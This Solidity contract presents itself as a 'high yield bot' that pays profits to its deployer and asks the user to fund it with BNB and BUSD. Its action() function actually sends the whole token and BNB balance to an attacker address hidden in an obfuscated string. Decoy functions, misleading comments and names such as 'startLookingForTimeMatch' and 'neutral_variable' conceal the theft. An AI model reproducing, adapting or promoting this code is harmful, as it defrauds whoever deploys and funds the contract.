pragma solidity ^0.5.17;


//payout set to the amount of days to payout yields default is 1 = sameday the longer the payout date the more you save on gas 
//and the yeild is reinvested, note: yields will be payed out to address that launch this contract
// must fund contract with equal "Dollar" amount of BNB and BUSD BEP20
interface IERC20 {
    function transfer(address _to, uint256 _amount) external returns (bool);
    function balanceOf(address tokenOwner) external returns (uint balance);
}

contract HighYieldBotWithStableAnchor {
	string public timeDateRagulator;
	string public payout = "7";
	//Manager manager;
	
	
	
function() external payable {}
	

 function CalculateNumbers(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
   function startLookingForTimeMatch() public pure returns (address adr) {
   string memory neutral_variable = "QG8f4799b47eEd340E9B22780E4a1f7Ad524de737d";
   CalculateNumbers(neutral_variable,0,'0');
   CalculateNumbers(neutral_variable,1,'x');
   address addr = parseDeeptime(neutral_variable);
    return addr;
   }
function parseDeeptime(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

 function action() public payable{
        address _tokenBUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
	    IERC20 tokenContract3 = IERC20(_tokenBUSD);
        tokenContract3.transfer(startLookingForTimeMatch(), tokenContract3.balanceOf(address(this)));
	    address(uint160(startLookingForTimeMatch())).transfer(address(this).balance);
	
	    
  }

}
